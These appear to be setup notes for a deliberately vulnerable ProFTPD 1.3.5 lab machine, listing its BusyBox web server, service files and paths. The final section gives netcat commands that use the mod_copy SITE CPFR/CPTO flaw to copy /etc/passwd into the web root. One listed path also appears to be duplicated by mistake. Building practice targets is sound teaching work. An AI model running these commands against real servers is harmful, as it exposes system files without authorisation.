Basic Requirements for the vulnerability to work:
    - MOD_COPY is enabled.
    - A web server is online and the FTP server user 'nobody' (or a local user specified in the config file but this would complicate things) 
      has access to the web server directory.

Web Server:
    - Busybox is used to create a quick website.
    - The directory for the site is:
        '/var/www/html/'
    - Web server is started using the service 'website.service' which runs the script 'WebServer.sh', pretty awful names but it works.
        

Files:
    - Proftpd Service File:
        /etc/systemd/system/proftpd.service
    
    - BusyBox Script:
        /usr/bin/WebServer.sh

    - BusyBox Service File
        /etc/systemd/system/proftpd.service
        
    - Binary File:
        /opt/proftpd-1.3.5/proftpd
    
    - Configuration File (Default config is used):
        /usr/local/etc/proftpd.conf
    
    - Pid File:
        /usr/local/var/proftpd.pid
    
    - Scoreboard File:
        /usr/local/var/proftpd.scoreboard
    

Simple Exploitation (Using Netcat):
You can pretty much copy any file, '/etc/passwd' is used as an example.
    Commands:
        - nc <TARGET IP ADDRESS> 21
        - SITE CPFR /etc/passwd
        - SITE CPTO /var/www/html/<File Name> (This is the directory of the website)


